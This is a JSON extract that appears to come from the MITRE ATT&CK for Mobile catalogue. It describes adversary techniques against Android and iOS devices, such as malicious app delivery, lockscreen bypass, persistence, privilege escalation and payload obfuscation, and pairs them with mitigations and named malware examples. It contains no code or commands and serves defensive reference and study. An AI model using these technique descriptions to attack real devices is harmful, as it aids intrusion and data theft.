        "Deliver Malicious App via Other Means": {
            "Name": "Deliver Malicious App via Other Means",
            "Description": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.Delivery methods for the malicious application include:Spearphishing Attachment - Including the mobile app package as an attachment to an email message.Spearphishing Link - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means.As a prerequisite, adversaries may use this PRE-ATT&CK technique:Obtain Apple iOS enterprise distribution key pair and certificate\n",
            "ID": "T1476",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "AUT-9, ECO-13, ECO-21",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Enterprise Policy",
                    "Description": "On iOS, the allowEnterpriseAppTrust and allowEnterpriseAppTrustModification configuration profile restrictions can be used to prevent users from installing apps signed using enterprise distribution keys."
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "iOS 9 and above requires explicit user consent before allowing installation of applications signed with enterprise distribution keys rather than installed from Apple's App Store. Users should be encouraged to not agree to installation of applications signed with enterprise distribution keys unless absolutely certain of the source of the application. On Android, the \"Unknown Sources\" setting must be enabled for users to install apps from sources other than an authorized app store (such as the Google Play Store), so users should be encouraged not to enable that setting."
                }
            ],
            "Examples": [
                {
                    "Name": "Android Overlay Malware",
                    "Description": "Android Overlay Malware was distributed by sending SMS messages with an embedded link to the malware.[1]"
                },
                {
                    "Name": "Android/Chuli.A",
                    "Description": "Android/Chuli.A was delivered via a spearphishing message containing a malicious Android application as an attachment.[2]"
                },
                {
                    "Name": "Marcher",
                    "Description": "Marcher is delivered via a link sent by SMS or email, including instructions advising the user to modify their Android device security settings to enable apps to be installed from \"Unknown Sources.\"[3]"
                },
                {
                    "Name": "MazarBOT",
                    "Description": "MazarBOT is delivered via an unsolicited text message containing a link to a web download URI.[4]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop uses ads or other links within web sites to encourage users to download the malicious apps. A complex content distribution network (CDN) and series of network redirects is used in an apparent attempt to evade malware detection techniques.[5]"
                },
                {
                    "Name": "RuMMS",
                    "Description": "RuMMS is delivered via an SMS message containing a link to an APK (Android application package).[6]"
                },
                {
                    "Name": "YiSpecter",
                    "Description": "YiSpecter's malicious apps were signed with iOS enterprise certificates issued by Apple to allow the apps to be installed as enterprise apps on non-jailbroken iOS devices.[7]"
                },
                {
                    "Name": "ZergHelper",
                    "Description": "ZergHelper abuses enterprises certificate and personal certificates to sign and distribute apps.[8]"
                }
            ]
        },
        "Drive-by Compromise": {
            "Name": "Drive-by Compromise",
            "Description": "As described by ATT&CK for Enterprise, a drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. For example, a website may contain malicious media content intended to exploit vulnerabilities in media parsers as demonstrated by the Android Stagefright vulnerability  [1].(This technique was formerly known as Malicious Web Content. It has been renamed to better align with ATT&CK for Enterprise.)\n",
            "ID": "T1456",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "CEL-22",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS was distributed through a web site by exploiting vulnerabilities in the Safari web browser on iOS devices.[2]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango is delivered via a a watering hole website that mimics the third-party Android app store APKMonk. In at least one case, the watering hole URL was distributed through Facebook Messenger.[3]"
                }
            ]
        },
        "Exploit via Charging Station or PC": {
            "Name": "Exploit via Charging Station or PC",
            "Description": "If the mobile device is connected (typically via USB) to a charging station or a PC, for example to charge the device's battery, then a compromised or malicious charging station or PC could attempt to exploit the mobile device via the connection.Krebs described this technique in [1]. Lau et al. [2] demonstrated the ability to inject malicious applications into an iOS device via USB. Hay [3] demonstrated the ability to exploit a Nexus 6 or 6P device over USB and then gain the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location. Horn [4] demonstrated the ability to exploit Android devices such as the Google Pixel 2 over USB.Products from Cellebrite and Grayshift purportedly can use physical access to the data port to unlock the passcode on some iOS devices [5].\n",
            "ID": "T1458",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "PHY-1",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Enterprise Policy",
                    "Description": "Enterprise policies should prevent enabling USB debugging on Android devices unless specifically needed (e.g., if the device is used for application development)."
                },
                {
                    "Mitigation": "Lock Bootloader",
                    "Description": ""
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Newer OS versions generally will include security patches against discovered vulnerabilities that become known to the vendor. Additionally, iOS 11.4.1 and higher introduce USB Restricted Mode, which under certain conditions disables data access through the device's charging port (making the port only usable for power), likely preventing this technique from working.[8]"
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "Users should be advised not to use public charging stations or computers to charge their devices. Instead, users should be issued a charger acquired from a trustworthy source. Users should be advised not to click on device prompts to trust attached computers unless absolutely necessary."
                }
            ],
            "Examples": [
                {
                    "Name": "DualToy",
                    "Description": "DualToy side loads malicious or risky apps to both Android and iOS devices via a USB connection.[6]"
                },
                {
                    "Name": "WireLurker",
                    "Description": "WireLurker monitors for iOS devices connected via USB to an infected OSX computer and installs downloaded third-party applications or automatically generated malicious applications onto the device.[7]"
                }
            ]
        },
        "Exploit via Radio Interfaces": {
            "Name": "Exploit via Radio Interfaces",
            "Description": "The mobile device may be targeted for exploitation through its interface to cellular networks or other radio interfaces.Baseband Vulnerability ExploitationA message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi or other) to the mobile device could exploit a vulnerability in code running on the device. D. Komaromy and N. Golde demonstrated baseband exploitation of a Samsung mobile device at the PacSec 2015 security conference. [1] Weinmann described and demonstrated \"the risk of remotely exploitable memory corruptions in cellular baseband stacks.\" [2]Malicious SMS MessageAn SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device. For example, Mulliner and Miller demonstrated such an attack against the iPhone in 2009. [3] An SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser. Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages. [4]\n",
            "ID": "T1477",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS was delivered via an SMS message containing a link to a web site with malicious code.[5]"
                }
            ]
        },
        "Install Insecure or Malicious Configuration": {
            "Name": "Install Insecure or Malicious Configuration",
            "Description": "An adversary could attempt to install insecure or malicious configuration settings on the mobile device, through means such as phishing emails or text messages either directly containing the configuration settings as an attachment, or containing a web link to the configuration settings. The device user may be tricked into installing the configuration settings through social engineering techniques [1].For example, an unwanted Certification Authority (CA) certificate could be placed in the device's trusted certificate store, increasing the device's susceptibility to man-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's network communication (Eavesdrop on Insecure Network Communication and Manipulate Device Communication).On iOS, malicious Configuration Profiles could contain unwanted Certification Authority (CA) certificates or other insecure settings such as unwanted proxy server or VPN settings to route the device's network traffic through an adversary's system. The device could also potentially be enrolled into a malicious Mobile Device Management (MDM) system [2].\n",
            "ID": "T1478",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion, Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "STA-7",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "iOS 10.3 and higher add an additional step for users to install new trusted CA certificates to make it more difficult to trick users into installing them. On Android, apps that target compatibility with Android 7 and higher (API Level 24) default to only trusting CA certificates that are bundled with the operating system, not CA certificates that are added by the user or administrator, hence decreasing their susceptibility to successful man-in-the-middle attack.[3][4]"
                },
                {
                    "Mitigation": "User Guidance",
                    "Description": "Typically, insecure or malicious configuration settings are not installed without the user's consent. Users should be advised not to install unexpected configuration settings (CA certificates, iOS Configuration Profiles, Mobile Device Management server provisioning)."
                }
            ]
        },
        "Lockscreen Bypass": {
            "Name": "Lockscreen Bypass",
            "Description": "An adversary with physical access to a mobile device may seek to bypass the device's lockscreen.Biometric SpoofingIf biometric authentication is used, an adversary could attempt to spoof a mobile device's biometric authentication mechanism. For example, SRLabs [1] describes providing a fake fingerprint, and SecureIDNews describes similar work by Michigan State University [2]. The Sun describes a case where someone else's face was able to unlock an iPhone X with Face ID [3].iOS partly mitigates this attack by requiring the device passcode rather than a fingerprint to unlock the device after every device restart and after 48 hours since the device was last unlocked [4]. Android has similar mitigations.Device Unlock Code Guessing or Brute ForceAn adversary could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (\"shoulder surfing\") the device owner's use of the lockscreen passcode. Exploit Other Device Lockscreen VulnerabilitiesTechniques have periodically been demonstrated that exploit vulnerabilities on Android [5], iOS [6], or other mobile devices to bypass the device lockscreen. The vulnerabilities are generally patched by the device/operating system vendor once they become aware of their existence.\n",
            "ID": "T1461",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Enterprise Policy",
                    "Description": "Enterprises can provision policies to mobile devices to require a minimum complexity (length, etc.) for the device passcode. Enterprises can provision policies to mobile devices to cause the device to wipe all data if an incorrect passcode is entered too many times. Both policies would mitigate brute-force, guessing, or shoulder surfing of the device passcode. If desired, enterprises can provision policies to mobile devices to disallow biometric authentication. However, as described by Apple's iOS Security Guide, biometric authentication can help make \"using a longer, more complex passcode far more practical because you don't need to enter it as frequently.\"[7]"
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ]
        },
        "Repackaged Application": {
            "Name": "Repackaged Application",
            "Description": "An adversary could download a legitimate app, disassemble it, add malicious code, and then reassemble the app, for example as described by Zhou and Jiang in [1]. The app would appear to be the original app but contain additional malicious functionality. The adversary could then publish this app to app stores or use another delivery technique.\n",
            "ID": "T1444",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-14",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "User Guidance",
                    "Description": "Users should be encouraged to only install apps from authorized app stores, which are less likely to contain malicious repackaged apps."
                }
            ],
            "Examples": [
                {
                    "Name": "DroidJack",
                    "Description": "DroidJack RAT included code from the legitimate Pokemon GO app in order to appear identical to the user, but it also included additional malicious code.[2]"
                },
                {
                    "Name": "X-Agent for Android",
                    "Description": "X-Agent for Android was placed in a repackaged version of an application used by Ukrainian artillery forces.[3]"
                }
            ]
        },
        "Supply Chain Compromise": {
            "Name": "Supply Chain Compromise",
            "Description": "As further described in ATT&CK for Enterprise, supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Somewhat related, adversaries could also identify and exploit inadvertently present vulnerabilities. In many cases, it may be difficult to be certain whether exploitable functionality is due to malicious intent or simply inadvertent mistake.Related PRE-ATT&CK techniques include:Identify vulnerabilities in third-party software libraries - Third-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities. For example, Ryan Welton of NowSecure identified exploitable remote code execution vulnerabilities in a third-party advertisement library [1]. Grace et al. identified security issues in mobile advertisement libraries [2].Distribute malicious software development tools - As demonstrated by the XcodeGhost attack [3], app developers could be provided with modified versions of software development tools (e.g. compilers) that automatically inject malicious or exploitable code into applications.\n",
            "ID": "T1474",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Initial Access",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-6",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Adups",
                    "Description": "Adups was pre-installed on Android devices from some vendors.[4][5]"
                },
                {
                    "Name": "Allwinner",
                    "Description": "A Linux kernel distributed by Allwinner reportedly contained an simple backdoor that could be used to obtain root access. It was believed to have been left in the kernel by mistake by the authors.[6]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango in at least one case may have been installed using physical access to the device by a repair shop.[7]"
                },
                {
                    "Name": "XcodeGhost",
                    "Description": "XcodeGhost was injected into apps by a modified version of Xcode (Apple's software development tool).[3][8]"
                }
            ]
        },
        "Abuse Device Administrator Access to Prevent Removal": {
            "Name": "Abuse Device Administrator Access to Prevent Removal",
            "Description": "A malicious application can request Device Administrator privileges. If the user grants the privileges, the application can take steps to make its removal more difficult.\n",
            "ID": "T1401",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Persistence",
            "Platform: ": "Android",
            "MTC ID: ": "APP-22",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "It is rare for applications to utilize Device Administrator access. App vetting can detect apps that do so, and those apps should be closely scrutinized. Maggi and Zanero describe a static analysis approach that can be used to identify ransomware apps including apps that abuse Device Administrator access.[4]"
                },
                {
                    "Mitigation": "Caution with Device Administrator Access",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "As described around the 44:20 mark of the \"What's new in Android security (M and N Version)\" talk at Google I/O 2016, changes were made in Android 7 to help prevent use of this technique.[5]"
                }
            ],
            "Examples": [
                {
                    "Name": "Marcher",
                    "Description": "Marcher requests Android Device Administrator access.[1]"
                },
                {
                    "Name": "OBAD",
                    "Description": "OBAD abuses device administrator access to make it more difficult for users to remove the application.[2]"
                },
                {
                    "Name": "XLoader",
                    "Description": "XLoader requests Android Device Administrator access.[3]"
                }
            ]
        },
        "App Auto-Start at Device Boot": {
            "Name": "App Auto-Start at Device Boot",
            "Description": "An Android application can listen for the BOOT_COMPLETED broadcast, ensuring that the app's functionality will be activated every time the device starts up without having to wait for the device user to manually start the app.Zhou and Jiang [1] analyzed 1260 Android malware samples belonging to 49 families of malware, and determined that 29 malware families and 83.3% of the samples listened for BOOT_COMPLETED.\n",
            "ID": "T1402",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Persistence",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Enterprises could potentially vet apps before allowing their use on devices, and carefully scrutinize apps that declare a BroadcastReceiver containing an intent-filter for BOOT_COMPLETED. Unfortunately this is likely not practical due to the vast number of apps with this behavior."
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android listens for the BOOT_COMPLETED broadcast intent in order to maintain persistence and activate its functionality at device boot time.[2]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer registers the broadcast receiver to listen for events related to device boot-up.[3]"
                },
                {
                    "Name": "SpyNote RAT",
                    "Description": "SpyNote RAT uses an Android broadcast receiver to automatically start when the device boots.[4]"
                }
            ]
        },
        "Modify cached executable code": {
            "Name": "Modify cached executable code",
            "Description": "ART (the Android Runtime) compiles optimized code on the device itself to improve performance. If an adversary can escalate privileges, he or she may be able to use those privileges to modify the cached code in order to hide malicious behavior. Since the code is compiled on the device, it may not receive the same level of integrity checks that are provided to code running in the system partition.Sabanal describes the potential use of this technique in  [1].\n",
            "ID": "T1403",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Persistence",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ]
        },
        "Modify OS Kernel or Boot Partition": {
            "Name": "Modify OS Kernel or Boot Partition",
            "Description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device kernel or other boot partition components, where the code may evade detection, may persist after device resets, and may not be removable by the device user. In some cases (e.g., the Samsung Knox warranty bit as described under Detection), the attack may be detected but could result in the device being placed in a state that no longer allows certain functionality.Many Android devices provide the ability to unlock the bootloader for development purposes, but doing so introduces the potential ability for others to maliciously update the kernel or other boot partition code.If the bootloader is not unlocked, it may still be possible to exploit device vulnerabilities to update the code.\n",
            "ID": "T1398",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-26, APP-27",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Attestation",
                    "Description": ""
                },
                {
                    "Mitigation": "Lock Bootloader",
                    "Description": ""
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "OldBoot",
                    "Description": "OldBoot uses escalated privileges to modify the init script on the device's boot partition to maintain persistence.[1]"
                }
            ]
        },
        "Modify System Partition": {
            "Name": "Modify System Partition",
            "Description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device system partition, where it may persist after device resets and may not be easily removed by the device user.Many Android devices provide the ability to unlock the bootloader for development purposes. An unlocked bootloader may provide the ability for an adversary to modify the system partition. Even if the bootloader is locked, it may be possible for an adversary to escalate privileges and then modify the system partition.\n",
            "ID": "T1400",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-27",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Lock Bootloader",
                    "Description": ""
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "System Partition Integrity",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "BrainTest",
                    "Description": "BrainTest uses root privileges (if available) to copy an additional Android app package (APK) to /system/priv-app to maintain persistence even after a factory reset.[1]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android attempts to modify the device's system partition.[2]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS modifies the system partition to maintain persistence.[3]"
                },
                {
                    "Name": "ShiftyBug",
                    "Description": "ShiftyBug is auto-rooting adware that embeds itself as a system application, making it nearly impossible to remove.[4]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer maintains persistence by installing an Android application package (APK) on the system partition.[5]"
                }
            ]
        },
        "Modify Trusted Execution Environment": {
            "Name": "Modify Trusted Execution Environment",
            "Description": "If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device's Trusted Execution Environment (TEE) or other similar isolated execution environment where the code can evade detection, may persist after device resets, and may not be removable by the device user. Running code within the TEE may provide an adversary with the ability to monitor or tamper with overall device behavior.Thomas Roth describes the potential for placing a rootkit within the TrustZone secure world [1].\n",
            "ID": "T1399",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion, Persistence",
            "Platform: ": "Android",
            "MTC ID: ": "APP-27",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                }
            ]
        },
        "Exploit OS Vulnerability": {
            "Name": "Exploit OS Vulnerability",
            "Description": "A malicious app can exploit unpatched vulnerabilities in the operating system to obtain escalated privileges.\n",
            "ID": "T1404",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Privilege Escalation",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-26",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting may be able to identify the presence of exploit code within applications."
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ],
            "Examples": [
                {
                    "Name": "BrainTest",
                    "Description": "Some original variants of BrainTest had the capability to automatically root some devices, but that behavior was not observed in later samples.[1]"
                },
                {
                    "Name": "Gooligan",
                    "Description": "Gooligan executes Android root exploits.[2]"
                },
                {
                    "Name": "HummingBad",
                    "Description": "HummingBad can exploit unfixed vulnerabilities in older Android versions to root victim phones.[3]"
                },
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android attempts to exploit well-known Android OS vulnerabilities to escalate privileges.[4]"
                },
                {
                    "Name": "Pegasus for iOS",
                    "Description": "Pegasus for iOS exploits iOS vulnerabilities to escalate privileges.[5]"
                },
                {
                    "Name": "ShiftyBug",
                    "Description": "ShiftyBug is packed with at least eight publicly available exploits that can perform rooting.[6]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree has the capability to exploit several known vulnerabilities and escalate privileges.[7]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer uses the commercial rooting app Baidu Easy Root to gain root privilege and maintain persistence on the victim.[8]"
                }
            ]
        },
        "Exploit TEE Vulnerability": {
            "Name": "Exploit TEE Vulnerability",
            "Description": "A malicious app or other attack vector could be used to exploit vulnerabilities in code running within the Trusted Execution Environment (TEE) [1]. The adversary could then obtain privileges held by the TEE potentially including the ability to access cryptographic keys or other sensitive data [2]. Escalated operating system privileges may be first required in order to have the ability to attack the TEE [3]. If not, privileges within the TEE can potentially be used to exploit the operating system [4].\n",
            "ID": "T1405",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Credential Access, Privilege Escalation",
            "Platform: ": "Android",
            "MTC ID: ": "APP-27",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": ""
                },
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": ""
                }
            ]
        },
        "Application Discovery": {
            "Name": "Application Discovery",
            "Description": "Adversaries may seek to identify all applications installed on the device. One use case for doing so is to identify the presence of endpoint security applications that may increase the adversary's risk of detection. Another use case is to identify the presence of applications that the adversary may wish to target.On Android, applications can use methods in the PackageManager class [1] to enumerate other apps installed on device, or an entity with shell access can use the pm command line tool.On iOS, apps can use private API calls to obtain a list of other apps installed on the device. [2] However, use of private API calls will likely prevent the application from being distributed through Apple's App Store.\n",
            "ID": "T1418",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion, Discovery",
            "Platform: ": "Android, iOS",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting techniques could search for use of the Android PackageManager class to enumerate other apps, and such applications could have extra scrutiny applied to them. However, this technique may not be practical if many apps invoke these methods as part of their legitimate behavior. On iOS, application vetting techniques could similarly search for use of the private API call necessary to obtain a list of apps installed on the device. Additionally, on iOS, use of the private API call is likely to result in the app not being accepted into Apple's App Store."
                }
            ],
            "Examples": [
                {
                    "Name": "Pegasus for Android",
                    "Description": "Pegasus for Android accesses the list of installed applications.[3]"
                },
                {
                    "Name": "Stealth Mango",
                    "Description": "Stealth Mango uploads information about installed packages.[4]"
                }
            ]
        },
        "Disguise Root/Jailbreak Indicators": {
            "Name": "Disguise Root/Jailbreak Indicators",
            "Description": "An adversary could use knowledge of the techniques used by security software to evade detection. For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed \"su\" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection as described by Rastogi et al. [1].Brodie [2] describes limitations of jailbreak/root detection mechanisms.Tan [3] describes his experience defeating the jailbreak detection used by the iOS version of Good for Enterprise.\n",
            "ID": "T1408",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "EMM-5",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Security Updates",
                    "Description": ""
                }
            ]
        },
        "Download New Code at Runtime": {
            "Name": "Download New Code at Runtime",
            "Description": "An app could download and execute dynamic code (not included in the original application package) after installation to evade static analysis techniques (and potentially dynamic analysis techniques) used for application vetting or application store review [1]. On Android, dynamic code could include native code, Dalvik code, or JavaScript code that uses the Android WebView's JavascriptInterface capability [2].On iOS, techniques for executing dynamic code downloaded after application installation include JSPatch [3]. Wang et al. describe a related method of constructing malicious logic at app runtime on iOS [4].\n",
            "ID": "T1407",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-20",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting techniques could (either statically or dynamically) look for indications that the application downloads and executes new code at runtime (e.g., on Android use of DexClassLoader, System.load, or the WebView JavaScriptInterface capability, or on iOS use of JSPatch or similar capabilities). Unfortunately, this is only a partial mitigation, as additional scrutiny would still need to be applied to applications that use these techniques, as the techniques are often used without malicious intent, and because applications may employ other techniques such as to hide their use of these techniques."
                }
            ],
            "Examples": [
                {
                    "Name": "BrainTest",
                    "Description": "Original samples of BrainTest download their exploit packs for rooting from a remote server after installation.[5]"
                },
                {
                    "Name": "Judy",
                    "Description": "Judy bypasses Google Play's protections by downloading a malicious payload at runtime after installation.[6]"
                },
                {
                    "Name": "RCSAndroid",
                    "Description": "RCSAndroid has the ability to dynamically download and execute new code at runtime.[7]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop downloads additional components (APKs, JAR files) from different C&C servers and stores them dynamically into the device’s memory, allowing the adversary to execute additional malicious APKs without having to embed them straight into the initial sample.[8]"
                },
                {
                    "Name": "Skygofree",
                    "Description": "Skygofree can download executable code from the C2 server after the implant starts or after a specific command.[9]"
                },
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer downloads and executes root exploits from a remote server.[10]"
                },
                {
                    "Name": "ZergHelper",
                    "Description": "ZergHelper attempts to extend its capabilities via dynamic updating of its code.[11]"
                }
            ]
        },
        "Obfuscated or Encrypted Payload": {
            "Name": "Obfuscated or Encrypted Payload",
            "Description": "An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or decrypt the code at runtime to evade many app vetting techniques, as described in  [1] [2] [3] [4].\n",
            "ID": "T1406",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Defense Evasion",
            "Platform: ": "Android, iOS",
            "MTC ID: ": "APP-21",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Application vetting techniques may be able to alert to the presence of obfuscated or encrypted code in applications, and such applications could have extra scrutiny applied. Unfortunately, this mitigation is likely impractical, as many legitimate applications apply code obfuscation or encryption to resist adversary techniques such as Repackaged Application. Dynamic analysis when used in application vetting may in some cases be able to identify malicious code in obfuscated or encrypted form by detecting the code at execution time (after it is deobfuscated or decrypted). Some application vetting techniques apply reputation analysis of the application developer and can alert to potentially suspicious applications without actual examination of application code."
                }
            ],
            "Examples": [
                {
                    "Name": "BrainTest",
                    "Description": "BrainTest stores a secondary Android app package (APK) in its assets directory in encrypted form, and decrypts the payload at runtime.[5]"
                },
                {
                    "Name": "Charger",
                    "Description": "Charger encodes strings into binary arrays to make it difficult to inspect them. It also loads code from encrypted resources dynamically and includes meaningless commands that mask the actual commands passing through.[6]"
                },
                {
                    "Name": "OBAD",
                    "Description": "OBAD contains encrypted code along with an obfuscated decryption routine to make it difficult to analyze.[3]"
                },
                {
                    "Name": "RedDrop",
                    "Description": "RedDrop contains malicious embedded files, which are compiled to initiate the malicious functionality.[7]"
                },
                {
                    "Name": "WireLurker",
                    "Description": "WireLurker obfuscates its payload through complex code structure, multiple component versions, file hiding, code obfuscation and customized encryption to thwart anti-reversing.[8]"
                },
                {
                    "Name": "XLoader",
                    "Description": "XLoader loads an encrypted DEX code payload.[9]"
                }
            ]
        },
        "Abuse Accessibility Features": {
            "Name": "Abuse Accessibility Features",
            "Description": "A malicious app could abuse Android's accessibility features to capture sensitive data or perform other malicious actions, as demonstrated in a proof of concept created by Skycure [1].\n",
            "ID": "T1453",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android",
            "Version": "1.0",
            "Mitigations": [
                {
                    "Mitigation": "Application Vetting",
                    "Description": "Enterprises could perform app vetting before allowing apps to be installed on devices and search for abuse of accessibility features as part of the analysis, or otherwise use mobile app reputation services to search for known malicious apps."
                },
                {
                    "Mitigation": "Use Recent OS Version",
                    "Description": "Android 7.0 and higher include additional protections against this technique."
                }
            ],
            "Examples": [
                {
                    "Name": "SpyDealer",
                    "Description": "SpyDealer abuses Android Accessibility features to steal messages from popular apps such as WeChat, Skype, Viber, and QQ.[2]"
                }
            ]
        },
        "Access Sensitive Data in Device Logs": {
            "Name": "Access Sensitive Data in Device Logs",
            "Description": "On versions of Android prior to 4.1, an adversary may use a malicious application that holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or other sensitive data stored in the device's system log. On Android 4.1 and later, an adversary would need to attempt to perform an operating system privilege escalation attack to be able to access the log.\n",
            "ID": "T1413",
            "Tactic Type: ": "Post-Adversary Device Access",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Android",
            "MTC ID: ": "APP-3, APP-13",
            "Version": "1.0",
            "Mitigations": [
